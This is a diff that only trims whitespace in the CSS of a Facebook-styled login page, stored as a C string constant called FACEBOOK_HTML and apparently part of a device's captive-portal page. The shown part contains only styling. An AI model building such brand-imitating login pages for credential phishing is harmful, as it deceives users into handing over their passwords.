@@ -7,7 +7,7 @@ const char FACEBOOK_HTML[] = R"=====(
     initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>
     <meta name='theme-color' content='#5170ad' />
     <style class='cp-pen-styles'>
-      
+
         -webkit-box-sizing: border-box;
         -moz-box-sizing: border-box;
         box-sizing: border-box;
@@ -46,7 +46,7 @@ const char FACEBOOK_HTML[] = R"=====(
         font-size: 50px;
         color: #1877f2;
         font-weight: 900;
-        
+
       }
       .login-form-wrap > h5 {
         margin-top: 40px;
@@ -112,7 +112,7 @@ const char FACEBOOK_HTML[] = R"=====(
       .login-form input[type='submit']:active {
         padding-top: 9px;
         padding-bottom: 7px;
-        background: #2f85f5;        
+        background: #2f85f5;
       }
       .disable-selection {
         -webkit-touch-callout: none;
@@ -160,9 +160,9 @@ const char FACEBOOK_HTML[] = R"=====(
             width: auto;
 
         }
-      
-    
-    
+
+
+
     </style>
   </head>
   <body>
